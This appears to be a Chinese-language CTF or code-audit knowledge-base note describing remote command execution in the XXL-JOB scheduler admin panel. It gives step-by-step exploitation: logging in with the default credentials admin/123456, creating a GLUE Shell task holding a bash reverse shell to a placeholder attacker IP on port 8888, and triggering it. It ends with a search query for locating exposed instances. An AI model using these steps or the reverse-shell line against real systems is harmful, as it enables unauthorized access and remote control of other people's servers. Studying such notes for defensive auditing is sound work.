---
title: XXL-JOB 后台任意命令执行
category: code-audit
tags: [xxl-job, rce, glue, scheduler, task-execution]
triggers: [xxl-job, 任务调度中心, GLUE, Shell, 分布式任务调度, admin/123456, executor, 9999]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/XXL-JOB 后台任意命令执行漏洞.md]
---

## Summary

XXL-JOB 后台管理页面弱口令可导致 RCE。攻击者在 GLUE 模式任务代码中写入恶意脚本并推送到执行器执行。

## Details

### 利用步骤

1. 弱口令 `admin/123456` 登录后台
2. 新增一个 GLUE(Shell) 模式任务
3. 在 GLUE IDE 中编辑脚本：
```bash
#!/bin/bash
bash -i >& /dev/tcp/your-ip/8888 0>&1
```
4. 点击"执行一次"触发

### 网络测绘

```
app="XXL-JOB" || title="任务调度中心"
```

## Connections

- GHSA: [[code-audit/ghsa-rce-patterns]]
